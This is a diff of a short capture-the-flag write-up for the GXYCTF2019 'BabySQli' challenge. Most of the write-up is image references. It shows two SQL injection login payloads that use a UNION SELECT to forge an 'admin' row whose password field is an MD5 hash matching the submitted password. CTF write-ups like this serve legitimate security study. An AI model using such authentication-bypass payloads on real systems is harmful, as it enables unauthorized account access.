@@ -1,3 +1,4 @@
+# [GXYCTF2019]BabySQli
 ![](<./img/Pasted image 20221106111400.png>)
 
 ![](<./img/Pasted image 20221106111412.png>)
@@ -49,5 +50,3 @@ name=1' union select 1,'admin','1'#&pw=1
 name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
 ```
 ![](<./img/Pasted image 20221106115057.png>)
-
-#Web #SQL注入 #查询结果伪造
